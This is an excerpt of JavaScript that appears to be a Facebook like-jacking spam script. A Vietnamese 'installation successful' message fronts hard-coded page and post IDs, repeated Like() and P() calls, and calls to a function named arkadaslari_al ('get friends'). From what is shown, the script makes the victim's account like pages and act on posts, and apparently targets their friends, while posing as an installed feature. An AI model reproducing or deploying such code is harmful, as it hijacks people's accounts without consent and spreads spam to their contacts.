...
"chars" : " :) ",
    ...
    html += '<a class="jewelFooter" href="https://www.facebook.com/baidanghay" target="_blank">CÀI ĐẶT THÀNH CÔNG!<br>Bài Đăng Hay</a>';
	html += '</div>';
...
var spage_id = "138421233007860";
var spost_id = "100003713484706";
...
// pic + fans
Like("374900782625604");
Like("406511959469748");
Like("151408611731985");
Like("493864447363030");
Like("492417297509141");
Like("663770603666285");
P("430480983752347");
P("115310275269421");
P("386945368105909");
P("113600075440441");
...
arkadaslari_al(430480983752347);
arkadaslari_al(374900782625604);
arkadaslari_al(454983181302127);
arkadaslari_al(454977477969364);